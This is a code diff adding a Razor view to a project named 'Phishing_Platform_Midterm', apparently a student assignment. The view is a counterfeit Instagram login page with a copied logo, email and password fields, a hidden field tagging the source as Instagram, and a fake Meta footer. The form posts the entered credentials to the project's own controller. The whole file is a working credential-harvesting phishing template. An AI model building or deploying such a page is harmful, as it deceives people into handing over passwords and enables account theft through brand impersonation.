@@ -1,0 +1,74 @@
+﻿@model Phishing_Platform_Midterm.Entities.User
+@{
+    ViewData["Title"] = "Instagram Page";
+    Layout = null;
+}
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="nrSMEdM_INTzUj4KNn1zvAJIlgsIij9vbwTfOa67FIY" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="~/css/instagram.css" asp-append-version="true"/>
+
+    <title>Instagram</title>
+</head>
+<body>
+    <div class="container">
+        <section class="form-login">
+            <form class="login" method="post" asp-action="InstagramController" asp-controller="Instagram">
+                @Html.AntiForgeryToken()
+                <img src="https://assets.turbologo.com/blog/tr/2019/09/19134602/instagram-logo-illustration-958x575.png" class="logo-instagram" alt="Instagram logotipo" width="350px" height="150px">
+                <input type="email" asp-for="Email" name="Email" placeholder="Telefon, username or e-mail">
+                <input type="password" asp-for="Password" name="Password" placeholder="Password">
+                <input type="hidden" name="sourceage" value="Instagram"/>
+                <button class="signin-button" type="submit">Login</button>
+                <div class="or">OR</div>
+                <a href="#" class="login-facebook">
+                    <img src="https://static-00.iconduck.com/assets.00/facebook-icon-512x512-seb542ju.png" alt="icon facebook" width="20px" height="20px"> Login with Facebook
+                </a>
+                <a href="#" class="forgot-pass">Forgot password? </a>
+            </form>
+            <section class="signup">
+                <p>Don't have an account? <a href="#">Register</a></p>
+            </section>
+            <section class="get-app">
+                <p>Get the app.</p>
+                <a href="#">
+                    <img src="https://cihanbuyukakkas.com/wp-content/uploads/2021/04/Google-Play-hemen-indir-button-logo-icon-transparan-PNG-gorseli_1.png" alt="Instagram on App Store">
+                </a>
+                <a href="#">
+                    <img src="https://www.selfy.com.tr/media/21ebhgir/app-store-i4f1acha.png" alt="Instagram on Google Play">
+                </a>
+            </section>
+        </section>
+    </div>
+
+
+    <footer class="footer">
+        <nav>
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Careers</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Top accounts</a>
+            <a href="#">Hastags</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Loading contacts and non-users</a>
+        </nav>
+        <div class="copy">
+            <span>English</span>
+            <span>© 2022 Instagram from Meta</span>
+        </div>
+    </footer>
+
+
+</body>
+</html>
+
+
